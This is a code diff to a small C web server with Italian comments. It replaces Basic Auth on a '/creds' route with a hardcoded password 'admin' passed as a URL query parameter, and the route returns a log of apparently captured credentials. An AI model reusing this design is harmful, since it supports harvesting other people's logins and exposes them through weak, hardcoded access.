@@ -12,6 +12,7 @@
 
 #define PORT 8080
 #define BUFFER_SIZE 8192
+#define CREDS_PASSWORD "admin"
 
 // Helper per decodificare URL hex (es. %20 -> ' ')
 void url_decode(char *dst, const char *src) {
@@ -313,7 +314,8 @@ int main() {
       if (s) {
         // Rimuove eventuali a capo e spazi finali
         int l = strlen(s);
-        while (l > 0 && (s[l - 1] == '\n' || s[l - 1] == '\r' || s[l - 1] == ' ')) {
+        while (l > 0 &&
+               (s[l - 1] == '\n' || s[l - 1] == '\r' || s[l - 1] == ' ')) {
           s[--l] = '\0';
         }
         if (strlen(s) > 0) {
@@ -404,21 +406,21 @@ int main() {
       if (tch)
         free(tch);
       free(log);
-    } else if (strcmp(path, "/creds") == 0 ||
-               strcmp(path, "/cgi-bin/creds.cgi") == 0 ||
-               strcmp(path, "/admin/creds") == 0) {
-      // Controlla Basic Auth: admin:admin (YWRtaW46YWRtaW4=)
-      // Se non combacia, restituisce 401
-      if (strstr(auth_header, "YWRtaW46YWRtaW4=") == NULL) {
-        send_response(client_fd, "401 Unauthorized", "text/plain",
-                      "Accesso non autorizzato.",
-                      "WWW-Authenticate: Basic realm=\"Admin\"\r\n");
-      } else {
+    } else if (strcmp(path, "/creds") == 0) {
+      char raw_p[128] = {0};
+      char dec_p[128] = {0};
+      if (get_param(qs, "p", raw_p, sizeof(raw_p))) {
+        url_decode(dec_p, raw_p);
+      }
+      if (strlen(dec_p) > 0 && strcmp(dec_p, CREDS_PASSWORD) == 0) {
         char *creds = read_file("/tmp/creds.log");
-        send_response(client_fd, "200 OK", "text/plain",
-                      creds ? creds : "Nessuna credenziale catturata.", NULL);
+        send_response(client_fd, "200 OK", "text/plain", creds ? creds : "",
+                      NULL);
         if (creds)
           free(creds);
+      } else {
+        send_response(client_fd, "403 Forbidden", "text/plain",
+                      "Password mancante o errata.", NULL);
       }
     } else {
       // Rotta di default per percorsi sconosciuti
